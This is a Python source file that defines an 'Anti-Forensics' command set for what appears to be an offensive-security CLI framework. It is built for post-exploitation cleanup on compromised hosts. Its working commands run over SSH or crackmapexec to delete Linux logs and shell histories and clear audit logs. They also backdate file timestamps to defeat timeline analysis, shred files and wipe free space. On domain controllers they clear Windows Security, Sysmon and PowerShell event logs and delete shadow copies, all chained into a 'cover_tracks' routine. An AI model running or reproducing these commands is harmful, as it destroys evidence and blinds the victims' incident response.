"""Anti-Forensics command set.

Covers post-exploitation cleanup: log wiping, timeline scrubbing, secure
file deletion, free space wiping, AD event-log clearing, and an all-in-one
cover-tracks operation.
"""

from __future__ import annotations

import os
import shlex
import subprocess
from pathlib import Path

import cmd2

from cli.commands._base import LazyOwnCommandSet
from utils import (
    print_error,
    print_msg,
    print_warn,
)

ANTI_FORENSICS_CATEGORY = "11. Anti-Forensics"
SHRED_PASSES = 7
WIPE_FREE_ITERATIONS = 3


class AntiForensicsCommandSet(LazyOwnCommandSet):
    """Anti-forensics operations for post-exploitation cleanup."""

    phase = "post"
    category = ANTI_FORENSICS_CATEGORY

    @cmd2.with_category(ANTI_FORENSICS_CATEGORY)
    def do_wipe_logs(self, line):
        """Clear system log files on the remote target.

        Usage: wipe_logs [--target <ip>] [--user <username>] [--all]

        Without --target, prepares local commands for manual execution.
        With --target, executes cleanup via SSH.
        """
        args = shlex.split(line)
        target = _extract_flag(args, "--target")
        user = _extract_flag(args, "--user") or "root"
        do_all = "--all" in args

        commands = [
            "journalctl --rotate",
            "journalctl --vacuum-time=1s",
            "rm -rf /var/log/*.log /var/log/*.gz /var/log/syslog* /var/log/messages* /var/log/auth*",
            "rm -rf /var/log/apache2/* /var/log/nginx/* /var/log/httpd/*",
            "rm -rf /var/log/mysql/* /var/log/postgresql/*",
            f"rm -rf {Path.home() / '.bash_history'} /home/*/.bash_history",
            f"rm -rf {Path.home() / '.zsh_history'} /home/*/.zsh_history",
            f"rm -rf {Path.home() / '.python_history'} /home/*/.python_history",
            f"rm -rf {Path.home() / '.mysql_history'} /home/*/.mysql_history",
            f"rm -rf {Path.home() / '.psql_history'} /home/*/.psql_history",
            f"rm -rf {Path.home() / '.viminfo'} /home/*/.viminfo",
            f"rm -rf {Path.home() / '.lesshst'} /home/*/.lesshst",
            f"rm -rf {Path.home() / '.wget-hsts'} /home/*/.wget-hsts",
        ]

        if do_all:
            commands.extend(
                [
                    "rm -rf /var/log/audit/* /var/log/auditd/*",
                    "rm -rf /tmp/* /var/tmp/*",
                    "rm -rf /var/cache/*",
                    "dmesg -c",
                    "history -c",
                ]
            )

        if target:
            from core.hardening import validate_host

            if not validate_host(target):
                print_error("Invalid target host")
                return
            ssh_cmd = ["ssh", f"{user}@{target}"]
            for cmd in commands:
                full_args = ssh_cmd + [cmd]
                print_msg(f'  ssh {user}@{target} "{cmd}"')
                try:
                    subprocess.run(full_args, shell=False, timeout=15, stderr=subprocess.DEVNULL)
                except subprocess.TimeoutExpired:
                    print_warn(f"  Timed out: {cmd}")
            print_msg("Logs wiped on target")
        else:
            print_msg("Copy-paste these commands on the target shell:")
            for cmd in commands:
                print_msg(f"  {cmd}")

    @cmd2.with_category(ANTI_FORENSICS_CATEGORY)
    def do_wipe_timeline(self, line):
        """Scrub file timestamps and shell history on the target.

        Usage: wipe_timeline [--target <ip>] [--user <username>] [--path <dir>]

        Touches all files under --path with a fixed timestamp to destroy
        forensic timeline analysis. Defaults to common writable paths.
        """
        args = shlex.split(line)
        target = _extract_flag(args, "--target")
        user = _extract_flag(args, "--user") or "root"
        path = _extract_flag(args, "--path") or "/var/www /tmp /var/tmp /opt"

        reference_date = "202001010000.00"
        commands = [
            "export HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0",
            "unset HISTFILE HISTSIZE HISTFILESIZE",
        ]
        for p in path.split():
            commands.append(f"find {p} -type f -exec touch -t {reference_date} {{}} \\; 2>/dev/null")
            commands.append(f"find {p} -type d -exec touch -t {reference_date} {{}} \\; 2>/dev/null")

        if target:
            from core.hardening import validate_host

            if not validate_host(target):
                print_error("Invalid target host")
                return
            ssh_cmd = ["ssh", f"{user}@{target}"]
            for cmd in commands:
                full_args = ssh_cmd + [cmd]
                try:
                    subprocess.run(full_args, shell=False, timeout=30, stderr=subprocess.DEVNULL)
                except (subprocess.TimeoutExpired, Exception):
                    pass
            print_msg("Timeline wiped on target")
        else:
            print_msg("Copy-paste these commands on the target:")
            for cmd in commands[:5]:
                print_msg(f"  {cmd}")
            print_msg(f"  # Plus touch -t on: {path}")

    @cmd2.with_category(ANTI_FORENSICS_CATEGORY)
    def do_shred(self, line):
        """Securely delete files by overwriting before removal.

        Usage: shred <file_path> [--passes <n>] [--target <ip>] [--user <username>]

        Overwrites the file N times with random data then deletes it.
        Defaults to 7 passes (DoD 5220.22-M standard).
        """
        args = shlex.split(line)
        if not args or args[0].startswith("--"):
            print_error("Usage: shred <file_path> [--passes <n>] [--target <ip>] [--user <username>]")
            return

        file_path = args[0]
        passes = int(_extract_flag(args, "--passes") or str(SHRED_PASSES))
        target = _extract_flag(args, "--target")
        user = _extract_flag(args, "--user") or "root"

        if target:
            if not file_path.startswith("/"):
                print_error("Remote file paths must be absolute")
                return
            from core.hardening import validate_host

            if not validate_host(target):
                print_error("Invalid target host")
                return
            ssh_base = ["ssh", f"{user}@{target}"]
            for i in range(passes):
                remote_cmd = f"dd if=/dev/urandom of={file_path} bs=1M conv=notrunc 2>/dev/null"
                print_msg(f"  Pass {i + 1}/{passes}")
                subprocess.run(ssh_base + [remote_cmd], shell=False, timeout=60, stderr=subprocess.DEVNULL)
            rm_cmd = f"rm -f {file_path}"
            subprocess.run(ssh_base + [rm_cmd], shell=False, timeout=10)
            print_msg(f"Shredded {file_path} on {target}")
        else:
            if not os.path.exists(file_path):
                print_error(f"File not found: {file_path}")
                return
            file_size = os.path.getsize(file_path)
            for _ in range(passes):
                with open(file_path, "r+b") as f:
                    f.seek(0)
                    f.write(os.urandom(file_size))
                    f.flush()
                    os.fsync(f.fileno())
            os.remove(file_path)
            print_msg(f"Shredded {file_path} ({passes} passes)")

    @cmd2.with_category(ANTI_FORENSICS_CATEGORY)
    def do_wipe_free(self, line):
        """Wipe free disk space to prevent forensic file recovery.

        Usage: wipe_free [--target <ip>] [--user <username>] [--path <mount_point>]

        Fills free space with random data then removes the filler file.
        Defaults to /tmp if no path is specified on remote targets.
        """
        args = shlex.split(line)
        target = _extract_flag(args, "--target")
        user = _extract_flag(args, "--user") or "root"
        path = _extract_flag(args, "--path") or "/tmp"

        if target:
            from core.hardening import validate_host

            if not validate_host(target):
                print_error("Invalid target host")
                return
            ssh_base = ["ssh", f"{user}@{target}"]
            wipe_cmds = [
                f"filler=$(mktemp -p {path} filler.XXXXXX)",
                'dd if=/dev/zero of="$filler" bs=1M 2>/dev/null || true',
                'shred -n 3 -u "$filler" 2>/dev/null || rm -f "$filler"',
            ]
            for cmd in wipe_cmds:
                subprocess.run(ssh_base + [cmd], shell=False, timeout=120, stderr=subprocess.DEVNULL)
            print_msg(f"Free space wiped on {target} ({path})")
        else:
            print_msg("For local wipe, use: cat /dev/zero > /tmp/wipe; shred -u /tmp/wipe")
            print_msg("Or install wipe/scrub: apt install wipe && wipe -rf /tmp")

    @cmd2.with_category(ANTI_FORENSICS_CATEGORY)
    def do_clean_ad(self, line):
        """Clear Active Directory event logs and cached Kerberos tickets.

        Usage: clean_ad [--target <dc_ip>] [--user <domain\\user>] [--password <pass>]

        Purges Security, System, and Application event logs on the DC.
        Clears Kerberos ticket cache on the attacker machine.
        """
        args = shlex.split(line)
        target = _extract_flag(args, "--target")
        user = _extract_flag(args, "--user")
        password = _extract_flag(args, "--password")

        local_cmds = [
            "kdestroy -A 2>/dev/null",
            "klist purge 2>/dev/null",
            "rm -f /tmp/krb5cc_* 2>/dev/null",
            "rm -f /tmp/krb5* 2>/dev/null",
            "echo '' > ~/.msf4/logs/framework.log 2>/dev/null",
        ]

        print_msg("Clearing local Kerberos tickets...")
        for cmd in local_cmds:
            try:
                parts = shlex.split(cmd)
                subprocess.run(parts, shell=False, timeout=5, stderr=subprocess.DEVNULL)
            except ValueError:
                subprocess.run(cmd.split(), shell=False, timeout=5, stderr=subprocess.DEVNULL)
        print_msg("Local tickets cleared")

        if target:
            auth = f"{user}%{password}" if (user and password) else ""
            dc_cmds = [
                "wevtutil cl Security",
                "wevtutil cl System",
                "wevtutil cl Application",
                "wevtutil cl 'Windows PowerShell'",
                "wevtutil cl 'Microsoft-Windows-Sysmon/Operational'",
                "wevtutil cl 'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational'",
                "vssadmin delete shadows /all /quiet",
                "wmic shadowcopy delete",
            ]

            for cmd in dc_cmds:
                if auth:
                    from core.hardening import set_sshpass_env

                    _env = set_sshpass_env(password)
                    full_args = ["crackmapexec", "smb", target, "-u", user, "-p", password, "-x", cmd]
                else:
                    _env = None
                    full_args = ["ssh", target, cmd]
                print_msg(f"  {' '.join(full_args[:4])} [redacted]")
                subprocess.run(full_args, shell=False, timeout=30, stderr=subprocess.DEVNULL, env=_env)
            print_msg(f"AD logs cleaned on {target}")

    @cmd2.with_category(ANTI_FORENSICS_CATEGORY)
    def do_cover_tracks(self, line):
        """Run all anti-forensics operations in sequence.

        Usage: cover_tracks [--target <ip>] [--user <username>] [--password <pass>]

        Executes: wipe_logs -> wipe_timeline -> clean_ad -> wipe_free.
        """
        args = shlex.split(line)
        target = _extract_flag(args, "--target")
        user = _extract_flag(args, "--user") or "root"
        password = _extract_flag(args, "--password") or ""

        print_msg("=== PHASE 1: Wipe Logs ===")
        self.do_wipe_logs(f"--target {target} --user {user}" if target else "")

        print_msg("\n=== PHASE 2: Wipe Timeline ===")
        self.do_wipe_timeline(f"--target {target} --user {user}" if target else "")

        print_msg("\n=== PHASE 3: Clean AD Artifacts ===")
        ad_line = ""
        if target:
            ad_line = f"--target {target}"
            if user:
                ad_line += f" --user {user}"
            if password:
                ad_line += f" --password {password}"
        self.do_clean_ad(ad_line)

        print_msg("\n=== PHASE 4: Wipe Free Space ===")
        self.do_wipe_free(f"--target {target} --user {user}" if target else "")

        print_msg("\nCover tracks complete.")


def _extract_flag(args: list[str], flag: str) -> str | None:
    """Extract a ``--flag <value>`` pair from a list of arguments."""
    try:
        idx = args.index(flag)
        return args[idx + 1]
    except (ValueError, IndexError):
        return None


__all__ = ["AntiForensicsCommandSet"]
